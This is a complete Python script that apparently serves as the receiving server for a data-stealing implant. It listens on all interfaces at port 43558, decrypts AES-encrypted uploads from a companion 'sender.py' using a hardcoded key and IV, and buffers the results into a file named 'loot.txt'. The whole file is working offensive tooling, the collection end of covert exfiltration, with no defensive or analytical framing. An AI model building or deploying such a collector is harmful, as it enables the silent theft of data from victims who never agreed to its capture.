#!/usr/bin/python3

import socket
import threading
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

# Encryption setup (must match sender.py)
SECRET_KEY = b'w\xd7\xc9=0\x17\xd1{\xe3\xc7{\x1a"\x8d\xa7\xb19\x87e\xb7gTQ\x98R\xed\xf2\x90\xbc\xfb2\xd2'
IV = b'\xed>\x86\x98\xed\xe5%\x99\x91\xe9r\x8b\t\xe3\xf2\xd2'

HOST = '0.0.0.0'  # Listen on all network interfaces
PORT = 43558
LOG_FILE = 'loot.txt'
WRITE_INTERVAL = 10

buffer = []
lock = threading.Lock()
stop_event = threading.Event()

def decrypt_data(encrypted_data):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
    decrypted_data = cipher.decrypt(base64.b64decode(encrypted_data))
    return unpad(decrypted_data, AES.block_size).decode()

def periodic_writer():
    while not stop_event.is_set():
        time.sleep(WRITE_INTERVAL)
        with lock:
            if buffer:
                with open(LOG_FILE, 'a', encoding='utf-8') as f:
                    f.write(''.join(buffer))
                    buffer.clear()

def main():
    writer_thread = threading.Thread(target=periodic_writer, daemon=True)
    writer_thread.start()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()

        print(f'[*] Listening on {HOST}:{PORT}')

        try:
            while True:
                conn, addr = s.accept()
                with conn:
                    print(f'[+] Connection from {addr}')

                    while True:
                        data = conn.recv(4096)
                        if not data:
                            break

                        try:
                            decrypted_text = decrypt_data(data)
                            with lock:
                                buffer.append(decrypted_text)
                        except Exception as e:
                            print(f'[!] Decryption error: {e}')

        except KeyboardInterrupt:
            print("\n[!] Shutting down server...")
            stop_event.set()
            writer_thread.join()

            # Flush remaining buffer
            with lock:
                if buffer:
                    with open(LOG_FILE, 'a', encoding='utf-8') as f:
                        f.write(''.join(buffer))

if __name__ == '__main__':
    main()
